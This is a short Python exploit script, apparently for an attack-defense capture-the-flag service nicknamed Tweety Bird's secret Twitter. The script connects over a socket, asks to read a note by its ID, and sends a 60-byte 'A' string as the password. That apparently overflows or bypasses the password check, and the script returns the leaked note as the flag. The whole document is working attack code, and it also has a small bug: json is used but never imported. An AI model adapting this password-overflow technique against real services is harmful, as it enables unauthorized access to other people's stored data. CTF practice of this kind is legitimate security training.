import socket
import sys
import pexpect
import pexpect.fdpexpect

def exploit(ip, port, flag_id):
    note_id = flag_id

    # Interaction with the service
    # Try to be robust, services will not always answer immediately
    conn = socket.create_connection((ip,port))
    c = pexpect.fdpexpect.fdspawn(conn.fileno())

    c.expect("Twee! Welcome to the secret Twitter, Tweety Bird.")
    c.expect("You are.*Facebook")
    c.expect("Want to \(R\)ead or \(W\)rite a twit?") # Note: these are RegExps!

    c.sendline("R")

    c.expect("Please type: twit_id password")

    #c.sendline("%s %s" % (flag_id, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCDDDDDDDDDDDDDDDD"))
    c.sendline("%s %s" % (flag_id, "A"*60))
    c.expect('\n')
    c.expect("Note content:.*")
    content = c.after.strip()[14:]
    c.close()
    conn.close()

    error = 0
    error_msg = ""

    return {'error': error,
            'error_msg': error_msg,
            'payload': {
                'flag': content
                }
            }


if __name__ == "__main__":
    print(json.dumps(exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3])))

